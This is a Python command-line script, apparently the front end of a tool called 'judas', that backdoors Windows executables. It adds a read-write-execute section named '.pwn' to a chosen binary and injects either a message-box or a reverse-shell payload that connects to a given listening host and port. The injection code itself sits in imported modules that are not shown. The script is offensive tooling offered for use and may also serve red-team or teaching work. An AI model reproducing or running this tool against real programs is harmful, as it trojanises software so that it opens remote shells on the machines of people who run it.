#! /usr/bin/env python3

import argparse
from _init_ import section_injection, payload_injection

banner = """
       __          __          
      / /_  ______/ /___ ______
 __  / / / / / __  / __ `/ ___/
/ /_/ / /_/ / /_/ / /_/ (__  ) 
\____/\__,_/\__,_/\__,_/____/                                
"""
print(banner)

# Create the parser
parser = argparse.ArgumentParser(
    description='Inject payload into a windows binary file')

# Add the arguments
parser.add_argument('path',
                    metavar='path',
                    type=str,
                    help='path to the binary that you wish to inject')

parser.add_argument('-lP',
                    '--lport',
                    type=int,
                    metavar='port',
                    help='listening port for payload')

parser.add_argument('-lH',
                    '--lhost',
                    type=str,
                    metavar='ip',
                    help='listening host for payload')

parser.add_argument('-sS',
                    '--section_size',
                    type=int,
                    metavar='size',
                    help='size for section to be injected',
                    default=0x1000)

parser.add_argument('-sP',
                    '--page_size',
                    type=int,
                    metavar='size',
                    help='size for section to be injected',
                    default=0x1000)

parser.add_argument('-t',
                    '--type',
                    type=str,
                    metavar='type',
                    default='msg',
                    choices=['msg', 'rev'],
                    help='size for section to be injected')

parser.add_argument('-pS',
                    '--section_permissions',
                    type=int,
                    metavar='permissions',
                    help='permissions for section to be injected',
                    default=0xE0000000)

parser.add_argument('-nS',
                    '--section_name',
                    type=str,
                    metavar='name',
                    help='name for section to be injected',
                    default=".pwn")

args = parser.parse_args()

print("Adding new section...")

injected_path = section_injection.add_section(args.path,
                                              args.section_name,
                                              args.page_size,        # Page Size 1024
                                              args.section_size,        # Section Size 1024
                                              args.section_permissions)    # permissions READ WRITE EXECUTE

print("Injecting payload...")
# insert_payload can take lhost and lport for rev
payload_injection.insert_payload(
    original_path=args.path,
    payload=args.type,
    lhost=args.lhost,
    lport=args.lport)
